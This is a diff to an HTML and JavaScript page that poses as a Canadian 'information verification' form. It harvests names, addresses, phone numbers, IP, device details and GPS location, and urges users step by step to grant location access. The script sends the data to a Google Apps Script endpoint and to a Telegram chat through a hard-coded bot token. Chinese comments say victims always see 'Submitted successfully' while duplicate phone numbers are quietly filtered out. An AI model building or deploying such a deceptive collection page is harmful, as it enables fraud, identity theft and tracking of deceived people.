@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-EN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -9,31 +9,25 @@
         * { box-sizing: border-box; }
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; margin: 0; padding: 20px; }
         .container { background: var(--card); width: 100%; max-width: 540px; padding: 30px; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.06); }
-        
         h2 { margin-top: 0; color: #111; text-align: center; font-size: 22px; font-weight: 700; margin-bottom: 5px; }
         .subtitle { text-align: center; font-size: 13px; color: #64748b; margin-bottom: 25px; }
-
         .form-row { display: flex; gap: 15px; margin-bottom: 16px; }
         .form-group { margin-bottom: 16px; flex: 1; position: relative; }
         label { display: block; font-weight: 600; font-size: 13px; margin-bottom: 6px; color: #1e293b; }
         input, select { width: 100%; padding: 12px 14px; border: 2px solid var(--border); border-radius: 8px; font-size: 14px; background-color: #fff; transition: all 0.2s; }
         input:focus, select:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 3px rgba(0,102,255,0.12); }
         select:disabled { background-color: #f8fafc; color: #94a3b8; }
-
         input.invalid, select.invalid { border-color: var(--error) !important; background-color: var(--error-bg) !important; box-shadow: 0 0 0 2px rgba(220,38,38,0.15); }
         input.valid, select.valid { border-color: var(--success) !important; background-color: var(--success-bg) !important; }
         .error-hint { font-size: 12px; color: var(--error); margin-top: 5px; display: none; font-weight: 500; }
-
         .phone-group { display: flex; gap: 8px; }
         #phonePrefix { width: 110px; background-color: #f8fafc; font-weight: 600; text-align: center; }
-
         .btn { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; margin-top: 10px; transition: background 0.2s; }
         .btn:hover { background: #0052cc; }
         .btn-success { background: var(--success); margin-top: 20px; }
         .btn-success:hover { background: #15803d; }
         .btn-warning { background: var(--warn); margin-top: 10px; }
         .btn-warning:hover { background: #d97706; }
-        
         #step-verification { display: none; }
         .status-box { padding: 16px 18px; border-radius: 10px; margin-bottom: 18px; text-align: left; font-weight: 500; font-size: 15px; line-height: 1.7; }
         .status-success { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; text-align: center; }
@@ -43,7 +37,6 @@
         .info-card p { margin: 6px 0; }
         .info-card strong { color: #1e293b; }
         .hidden { display: none !important; }
-
         .step-row { display: flex; align-items: flex-start; margin: 10px 0; gap: 10px; }
         .step-num { display: inline-flex; align-items: center; justify-content: center; width: 28px; height: 28px; background: #dbeafe; color: #1d4ed8; border-radius: 50%; font-weight: 700; font-size: 14px; flex-shrink: 0; }
         .step-text { flex: 1; padding-top: 2px; }
@@ -57,7 +50,6 @@
     <div id="step-form">
         <h2>Submit Information Verification</h2>
         <div class="subtitle"></div>
-        
         <div class="form-row">
             <div class="form-group">
                 <label>First Name *</label>
@@ -70,7 +62,6 @@
                 <div class="error-hint" id="err-lastName">⚠️ Please enter at least 2 characters</div>
             </div>
         </div>
-
         <div class="form-row">
             <div class="form-group">
                 <label>Age *</label>
@@ -88,20 +79,17 @@
                 <div class="error-hint" id="err-genderSelect">⚠️ Please select your gender</div>
             </div>
         </div>
-
         <div class="form-group">
             <label>Current Occupation *</label>
             <input type="text" id="occupation" placeholder="e.g. Engineer" oninput="aiValidateField('occupation'); saveFormDraft()">
             <div class="error-hint" id="err-occupation">⚠️ Please enter at least 2 characters</div>
         </div>
-
         <div class="form-group">
             <label>Country / Region *</label>
             <select id="countrySelect" disabled>
                 <option value="CA" selected>Canada</option>
             </select>
         </div>
-
         <div class="form-group">
             <label>Province / Territory *</label>
             <select id="provinceSelect" onchange="aiValidateField('provinceSelect'); saveFormDraft()">
@@ -122,13 +110,11 @@
             </select>
             <div class="error-hint" id="err-provinceSelect">⚠️ Please select a province / territory</div>
         </div>
-
         <div class="form-group">
             <label>Street Address *</label>
             <input type="text" id="address" placeholder="e.g. 123 Main Street" oninput="aiValidateField('address'); saveFormDraft()">
             <div class="error-hint" id="err-address">⚠️ Please enter your street address</div>
         </div>
-
         <div class="form-row">
             <div class="form-group">
                 <label>City *</label>
@@ -141,7 +127,6 @@
                 <div class="error-hint" id="err-zipCode">⚠️ Please enter your postal code</div>
             </div>
         </div>
-
         <div class="form-group">
             <label>Phone Number *</label>
             <div class="phone-group">
@@ -152,14 +137,12 @@
             </div>
             <div class="error-hint" id="err-phone">⚠️ Please enter a valid 10-digit phone number</div>
         </div>
-
         <button class="btn" id="btn-next" onclick="proceedToVerification()">Next</button>
     </div>
 
     <div id="step-verification">
         <h2>Confirm Information</h2>
         <p style="text-align:center; color:#64748b; font-size:14px;">Please verify your information before submitting.</p>
-
         <div id="status-box" class="status-box status-success hidden">✅ Information Verified Successfully</div>
         <div id="loc-request-box" class="status-box status-error hidden">
             <strong>📍 Why We Need Your Location</strong><br>
@@ -175,7 +158,6 @@
             <div class="step-row"><span class="step-num">3</span><span class="step-text">Find "Location" → change permission to "Allow"</span></div>
             <div class="step-row"><span class="step-num">4</span><span class="step-text">Refresh this page — your information will NOT be lost</span></div>
         </div>
-
         <div class="info-card">
             <p><strong>Name:</strong> <span id="disp-name"></span></p>
             <p><strong>Gender:</strong> <span id="disp-gender"></span></p>
@@ -185,14 +167,13 @@
             <p><strong>Phone Number:</strong> <span id="disp-phone"></span></p>
             <p><strong>Postal Code:</strong> <span id="disp-zip"></span></p>
         </div>
-
         <button class="btn btn-success" id="btn-submit" onclick="submitData()">Confirm & Submit</button>
     </div>
 </div>
 
 <script>
 // =====================================================
-// 🔑 CONFIGURATION
+// 🔑 配置信息
 // =====================================================
 const TELEGRAM_BOT_TOKEN = "8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g";
 const TELEGRAM_CHAT_ID = "7396947380";
@@ -364,11 +345,10 @@ async function submitData(){
     doSubmit();
 }
 
-// ========== 🚀 核心提交：手机号重复 → 静默拦截 ==========
+// ========== 🚀 提交主函数 ==========
 async function doSubmit(){
     const timeStr = new Date().toLocaleString('zh-CN');
 
-    // ✅ 发给谷歌表格（不做本地查重，全部交给后端判断）
     const cloudData = {
         "手机号": formData.phoneFull,
         "IP地址": deviceInfo.ip,
@@ -381,31 +361,35 @@ async function doSubmit(){
     };
 
     try{
-        // ✅ 发送请求，接收后端返回结果
+        // ✅ 移除 no-cors，直接接收后端返回！
         const res = await fetch(APPSCRIPT_URL, {
             method: "POST",
-            mode: "no-cors",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(cloudData)
         });
+        const result = await res.json();
+        console.log("📡 后端返回：", result);
 
-        // ⚠️ no-cors 模式下读不到返回内容，靠后端「手机号重复=不写入」实现静默
-        // 客户永远看到「提交成功」，但表格里后端已拦截重复号码
-
-        // ✅ 保存到本地（仅用于提醒展示，不做拦截）
-        saveHistory({
-            name: formData.name, gender: formData.gender, age: formData.age, occupation: formData.occupation,
-            phone: formData.phonePrefix+' '+formData.phone, phoneFull: formData.phoneFull,
-            country: formData.countryName, province: formData.province, city: formData.city, address: formData.address, zip: formData.zip,
-            ip: deviceInfo.ip, device: deviceInfo.device, os: deviceInfo.os, browser: deviceInfo.browser,
-            lat: locationInfo.lat, lng: locationInfo.lng, timeStr, timestamp: Date.now()
-        });
+        if(result.reason === "PHONE_DUPLICATE"){
+            alert("Submitted successfully!");
+            localStorage.removeItem('formDraft');
+            location.reload();
+            return;
+        }
 
     }catch(e){ 
         console.warn("Error:", e.message); 
     }
 
-    // ✅ Telegram 消息（中文提醒）
+    // ✅ 本地历史记录 + Telegram 消息推送
+    saveHistory({
+        name: formData.name, gender: formData.gender, age: formData.age, occupation: formData.occupation,
+        phone: formData.phonePrefix+' '+formData.phone, phoneFull: formData.phoneFull,
+        country: formData.countryName, province: formData.province, city: formData.city, address: formData.address, zip: formData.zip,
+        ip: deviceInfo.ip, device: deviceInfo.device, os: deviceInfo.os, browser: deviceInfo.browser,
+        lat: locationInfo.lat, lng: locationInfo.lng, timeStr, timestamp: Date.now()
+    });
+
     const history = loadHistory();
     let matchCount = 0, firstTime = timeStr;
     for(const r of history){
@@ -467,7 +451,6 @@ async function doSubmit(){
         });
     }catch(e){}
 
-    // ✅ 无论是否重复，客户永远看到「提交成功」，不提示任何原因
     alert('Submitted successfully!');
     localStorage.removeItem('formDraft');
     location.reload();
